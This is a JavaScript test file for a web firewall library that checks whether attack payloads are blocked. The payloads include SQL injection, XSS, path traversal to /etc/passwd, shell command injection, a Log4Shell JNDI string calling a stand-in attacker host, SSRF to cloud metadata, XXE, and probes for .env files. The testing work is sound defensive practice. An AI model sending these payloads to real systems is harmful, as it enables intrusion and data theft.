/*
 * 824 Shield — defense against AI-driven attacks.
 * Copyright (C) 2026 Nicholas Smith / 824
 *
 * This file is part of 824 Shield, free software licensed under the
 * GNU General Public License v3.0 (see the LICENSE file).
 */

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { Shield, scanPayload, securityHeaders, applySecurityHeaders } from '../src/index.js';

const BROWSER = {
  'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36',
  'accept': 'text/html,application/xhtml+xml',
  'accept-language': 'en-US,en;q=0.9',
  'accept-encoding': 'gzip, deflate, br',
  'sec-fetch-site': 'same-origin',
};

const judge = (shield, ctx) => shield.evaluate({ headers: BROWSER, ...ctx });

test('blocks a SQL injection login bypass', () => {
  const d = judge(new Shield(), {
    ip: '10.1.0.1', method: 'POST', path: '/login',
    bodyText: JSON.stringify({ email: "admin' OR 1=1 --", password: 'x' }),
  });
  assert.equal(d.action, 'block');
  assert.ok(d.scores.exploit >= 60);
});

test('blocks a UNION SELECT extraction attempt', () => {
  const d = judge(new Shield(), {
    ip: '10.1.0.2', method: 'GET', path: '/api/products',
    bodyText: '1 UNION SELECT username, password FROM users',
  });
  assert.equal(d.action, 'block');
});

test('blocks an XSS script tag in a review', () => {
  const d = judge(new Shield(), {
    ip: '10.1.0.3', method: 'POST', path: '/api/reviews',
    bodyText: JSON.stringify({ text: '<script>alert(document.cookie)</script>' }),
  });
  assert.equal(d.action, 'block');
});

test('blocks path traversal toward /etc/passwd', () => {
  const d = judge(new Shield(), {
    ip: '10.1.0.4', method: 'POST', path: '/api/file',
    bodyText: 'file=../../../../etc/passwd',
  });
  assert.equal(d.action, 'block');
});

test('catches percent-encoded traversal', () => {
  const result = scanPayload('%2e%2e%2f%2e%2e%2fetc%2fpasswd');
  assert.ok(result.score >= 60, `score was ${result.score}`);
});

test('blocks shell command injection', () => {
  const d = judge(new Shield(), {
    ip: '10.1.0.5', method: 'POST', path: '/api/ping',
    bodyText: 'host=example.com; rm -rf /tmp/x',
  });
  assert.equal(d.action, 'block');
});

test('blocks a Log4Shell-style JNDI payload', () => {
  const d = judge(new Shield(), {
    ip: '10.1.0.6', method: 'POST', path: '/api/chat',
    bodyText: JSON.stringify({ name: '${jndi:ldap://evil.example/Exploit}' }),
  });
  assert.equal(d.action, 'block');
});

test('blocks SSRF aimed at the cloud metadata endpoint', () => {
  const d = judge(new Shield(), {
    ip: '10.1.0.7', method: 'POST', path: '/api/fetch-image',
    bodyText: JSON.stringify({ url: 'http://169.254.169.254/latest/meta-data/' }),
  });
  assert.equal(d.action, 'block');
});

test('blocks an XXE payload', () => {
  const d = judge(new Shield(), {
    ip: '10.1.0.8', method: 'POST', path: '/api/import',
    bodyText: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
  });
  assert.equal(d.action, 'block');
});

test('challenges a template arithmetic probe and blocks object escape', () => {
  const probe = judge(new Shield(), {
    ip: '10.1.0.9', method: 'POST', path: '/api/render',
    bodyText: JSON.stringify({ name: '{{7*7}}' }),
  });
  assert.equal(probe.action, 'challenge');
  const escape = judge(new Shield(), {
    ip: '10.1.0.10', method: 'POST', path: '/api/render',
    bodyText: JSON.stringify({ name: '{{config.__class__}}' }),
  });
  assert.equal(escape.action, 'block');
});

test('blocks prototype pollution keys', () => {
  const d = judge(new Shield(), {
    ip: '10.1.0.11', method: 'POST', path: '/api/profile',
    bodyText: '{"user":{"__proto__":{"admin":true}}}',
  });
  assert.equal(d.action, 'block');
});

test('blocks encoded CRLF header injection', () => {
  const result = scanPayload('q=hello%0d%0aSet-Cookie: session=hacked');
  assert.ok(result.score >= 60, `score was ${result.score}`);
});

test('blocks probes for secrets and repo files', () => {
  for (const path of ['/.env', '/.git/config']) {
    const d = judge(new Shield(), { ip: '10.1.0.12', method: 'GET', path });
    assert.equal(d.action, 'block', path);
  }
});

test('ordinary words about products score zero exploit points', () => {
  const d = judge(new Shield(), {
    ip: '10.1.0.13', method: 'POST', path: '/api/chat',
    bodyText: JSON.stringify({ message: 'How do I select a size and update my profile?' }),
  });
  assert.equal(d.scores.exploit, 0);
  assert.equal(d.action, 'allow');
});

test('blocklisted IPs are blocked instantly', () => {
  const shield = new Shield({ blocklist: ['203.0.113.66'] });
  const d = judge(shield, { ip: '203.0.113.66', method: 'GET', path: '/' });
  assert.equal(d.action, 'block');
  assert.ok(d.reasons.join(' ').includes('blocklist'));
});

test('oversized payloads are blocked', () => {
  const shield = new Shield({ maxBodyBytes: 16 });
  const d = judge(shield, {
    ip: '10.1.0.14', method: 'POST', path: '/api/upload',
    bodyText: 'a'.repeat(100),
  });
  assert.equal(d.action, 'block');
});

test('security headers carry the defensive set', () => {
  const headers = securityHeaders();
  assert.match(headers['Content-Security-Policy'], /default-src 'self'/);
  assert.equal(headers['X-Content-Type-Options'], 'nosniff');
  assert.equal(headers['X-Frame-Options'], 'DENY');
});

test('applySecurityHeaders fills gaps without overriding the app', async () => {
  const original = new Response('ok', { headers: { 'Content-Security-Policy': 'custom-policy' } });
  const wrapped = applySecurityHeaders(original);
  assert.equal(wrapped.headers.get('Content-Security-Policy'), 'custom-policy');
  assert.equal(wrapped.headers.get('X-Frame-Options'), 'DENY');
  assert.equal(await wrapped.text(), 'ok');
});
